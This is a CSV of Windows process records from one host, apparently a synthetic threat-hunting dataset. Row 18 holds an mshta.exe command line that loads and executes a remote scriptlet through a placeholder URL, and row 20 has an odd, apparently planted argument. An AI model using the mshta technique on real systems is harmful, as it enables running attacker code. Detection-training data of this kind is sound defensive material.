,arguments,hostname,name,path,pid,username
0,C:\Windows\system32\svchost.exe -k LocalService -p,0005JOFSS,svchost.exe,C:\Windows\system32,2152,NT AUTHORITY\SYSTEM
1,c:\windows\system32\svchost.exe -k netsvcs -p -s TokenBroker,0005JOFSS,svchost.exe,c:\windows\system32,3772,NT AUTHORITY\SYSTEM
2,c:\windows\system32\svchost.exe -k unistacksvcgroup -s WpnUserService,0005JOFSS,svchost.exe,c:\windows\system32,212,NT AUTHORITY\SYSTEM
3,c:\windows\system32\svchost.exe -k networkservice -p -s NlaSvc,0005JOFSS,svchost.exe,c:\windows\system32,4008,NT AUTHORITY\SYSTEM
4,c:\windows\system32\svchost.exe -k netsvcs -p,0005JOFSS,svchost.exe,c:\windows\system32,1608,NT AUTHORITY\SYSTEM
5,c:\windows\system32\svchost.exe -k netsvcs -p -s BITS,0005JOFSS,svchost.exe,c:\windows\system32,3416,NT AUTHORITY\SYSTEM
6,c:\windows\system32\svchost.exe -k networkservice -p -s CryptSvc,0005JOFSS,svchost.exe,c:\windows\system32,2820,NT AUTHORITY\SYSTEM
7,c:\windows\system32\svchost.exe -k networkservice -p -s LanmanWorkstation,0005JOFSS,svchost.exe,c:\windows\system32,6020,NT AUTHORITY\SYSTEM
8,,0005JOFSS,System,,2740,NT AUTHORITY\SYSTEM
9,C:\Windows\System32\RuntimeBroker.exe -Embedding,0005JOFSS,RuntimeBroker.exe,C:\Windows\System32,3476,NT AUTHORITY\SYSTEM
10,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",0005JOFSS,McApExe.exe,C:\Program Files\Common Files\McAfee\VSCore_18_6,3580,emil.benne
11,c:\windows\system32\svchost.exe -k localserviceandnoimpersonation -p -s SSDPSRV,0005JOFSS,svchost.exe,c:\windows\system32,2456,NT AUTHORITY\SYSTEM
12,C:\Windows\system32\svchost.exe -k SDRSVC,0005JOFSS,svchost.exe,C:\Windows\system32,3260,NT AUTHORITY\SYSTEM
13,c:\windows\system32\svchost.exe -k localservice -p -s LicenseManager,0005JOFSS,svchost.exe,c:\windows\system32,1284,NT AUTHORITY\SYSTEM
14,C:\Windows\system32\BtwRSupportService.exe,0005JOFSS,BtwRSupportService.exe,C:\Windows\system32,3940,NT AUTHORITY\SYSTEM
15,C:\Windows\system32\lsass.exe,0005JOFSS,lsass.exe,C:\Windows\system32,680,NT AUTHORITY\SYSTEM
16,"""C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe"" -ServerName:WindowsDefaultLockScreen.AppX7y4nbzq37zn4ks9k7amqjywdat7d3j2z.mca",0005JOFSS,LockApp.exe,C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy,1476,NT AUTHORITY\SYSTEM
17,c:\windows\system32\svchost.exe -k networkservice -p -s TapiSrv,0005JOFSS,svchost.exe,c:\windows\system32,6068,NT AUTHORITY\SYSTEM
18,C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();,0005JOFSS,mshta.exe,C:\Windows\System32\mshta.exe,1296,NT AUTHORITY\SYSTEM
19,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0005JOFSS,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,1488,emil.benne
20,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,0005JOFSS,ModuleCoreService.exe,c:\program files\common files\mcafee\modulecore,2072,emil.benne
21,"""ctfmon.exe""",0005JOFSS,ctfmon.exe,C:\Windows\system32,536,NT AUTHORITY\SYSTEM
22,,0005JOFSS,SecurityHealthService.exe,,648,NT AUTHORITY\SYSTEM
23,c:\windows\system32\svchost.exe -k netsvcs -p -s LanmanServer,0005JOFSS,svchost.exe,c:\windows\system32,4856,NT AUTHORITY\SYSTEM
24,"""fontdrvhost.exe""",0005JOFSS,fontdrvhost.exe,C:\Windows\System32,2356,NT AUTHORITY\SYSTEM
25,c:\windows\system32\svchost.exe -k dcomlaunch -p -s LSM,0005JOFSS,svchost.exe,c:\windows\system32,5808,NT AUTHORITY\SYSTEM
26,c:\windows\system32\svchost.exe -k dcomlaunch -p -s PlugPlay,0005JOFSS,svchost.exe,c:\windows\system32,2396,NT AUTHORITY\SYSTEM
27,C:\Windows\system32\svchost.exe -k DcomLaunch -p,0005JOFSS,svchost.exe,C:\Windows\system32,4668,NT AUTHORITY\SYSTEM
28,C:\Windows\system32\ApplicationFrameHost.exe -Embedding,0005JOFSS,ApplicationFrameHost.exe,C:\Windows\system32,492,NT AUTHORITY\SYSTEM
29,c:\windows\system32\svchost.exe -k netsvcs -p -s iphlpsvc,0005JOFSS,svchost.exe,c:\windows\system32,1256,NT AUTHORITY\SYSTEM
30,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",0005JOFSS,PEFService.exe,C:\Program Files\Common Files\McAfee\PEF\CORE,502,emil.benne
